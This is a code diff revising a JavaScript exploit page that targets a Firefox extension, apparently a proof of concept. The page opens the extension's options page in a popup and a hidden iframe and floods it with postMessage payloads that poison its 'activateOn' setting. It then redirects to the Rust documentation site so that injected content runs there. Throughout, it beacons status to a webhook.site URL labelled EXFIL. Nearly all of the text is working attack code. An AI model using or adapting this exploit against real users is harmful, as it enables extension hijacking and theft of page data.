@@ -13,7 +13,7 @@ const EXT_UUID = '09a6c422-a354-447d-b4ea-185cb10be869';
 const OPTIONS  = `moz-extension://${EXT_UUID}/options.html`;
 const EXFIL    = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';
 const DOC      = 'https://doc.rust-lang.org/';
-const beacon = (s) => new Promise(r => { const i = new Image(); i.onload=i.onerror=r; i.src = EXFIL + '/b?s=' + encodeURIComponent(s) + '&t=' + Date.now(); setTimeout(r,600); });
+const beacon = (s) => { try { new Image().src = EXFIL + '/b?s=' + encodeURIComponent(s) + '&t=' + Date.now(); } catch(e){} };
 
 new MutationObserver((muts) => {
   for (const m of muts) for (const n of m.addedNodes) {
@@ -26,39 +26,41 @@ new MutationObserver((muts) => {
 
 const wait = (ms) => new Promise(r => setTimeout(r, ms));
 
+// Try to set activateOn via BOTH a popup (top-level, first-party storage) and an iframe.
+async function setActivateOn(cfgUrl, tag) {
+  // popup
+  let w = null;
+  try { w = window.open(OPTIONS, 'opt_' + tag, 'width=120,height=120'); } catch(e){}
+  beacon(tag + ':popup=' + (!!w));
+  // iframe
+  const f = document.createElement('iframe'); f.style.display='none'; f.src = OPTIONS;
+  document.body.appendChild(f);
+  await wait(1200);
+  for (let i=0;i<15;i++){
+    try { if (w && !w.closed) w.postMessage(cfgUrl, '*'); } catch(e){}
+    try { f.contentWindow.postMessage(cfgUrl, '*'); } catch(e){}
+    await wait(150);
+  }
+  beacon(tag + ':posted');
+}
+
 (async () => {
   const stage = new URL(location.href).searchParams.get('stage');
-  await beacon('load:' + (stage||'init'));
+  beacon('load:' + (stage||'init'));
 
   if (stage !== 'poison') {
-    // load options iframe and probe what actually loaded
-    const f = document.createElement('iframe');
-    f.src = OPTIONS;
-    f.style.display='none';
-    const loaded = new Promise(r => { f.onload=()=>r('onload'); f.onerror=()=>r('onerror'); setTimeout(()=>r('timeout'),4000); });
-    document.body.appendChild(f);
-    await beacon('iframe-event:' + await loaded);
-    // probe cross-origin-ness (throws => real moz-extension page; readable => blank/blocked)
-    try { const d = f.contentDocument; await beacon('cdoc:' + (d===null?'null':('READABLE:'+(d.location&&d.location.href||'?').slice(0,50)))); }
-    catch(e){ await beacon('cdoc-throw:' + e.name); }
-    try { await beacon('cwin-origin:' + f.contentWindow.origin); } catch(e){ await beacon('cwin-throw:' + e.name); }
-    // spam config message
-    for (let i=0;i<20;i++){ try{ f.contentWindow.postMessage(location.origin + '/?x=' + DOC, '*'); }catch(e){} await wait(150); }
-    await beacon('posted');
-    await wait(1500);
-    await beacon('nav->poison');
+    await setActivateOn(location.origin + '/?x=' + DOC, 'self');
+    await wait(500);
+    beacon('nav->poison');
     location.href = location.pathname + '?stage=poison&r=' + DOC;
     return;
   }
 
-  await wait(3500);
-  await beacon('body:tags=' + [...document.body.children].map(c=>c.tagName).join(','));
-  // if cs.js ran we're done exfil-wise; still hop to docs for the real read
-  await wait(500);
-  const f2 = document.createElement('iframe'); f2.src=OPTIONS; f2.style.display='none';
-  await new Promise(r=>{ f2.onload=r; setTimeout(r,3000); document.body.appendChild(f2); });
-  for (let i=0;i<12;i++){ try{ f2.contentWindow.postMessage(DOC,'*'); }catch(e){} await wait(150); }
-  await beacon('nav->docs');
+  await wait(3000);
+  beacon('body:tags=' + [...document.body.children].map(c=>c.tagName).join(','));
+  await setActivateOn(DOC, 'docs');
+  await wait(400);
+  beacon('nav->docs');
   location.href = 'https://doc.rust-lang.org/stable/std/index.html';
 })();
 </script>
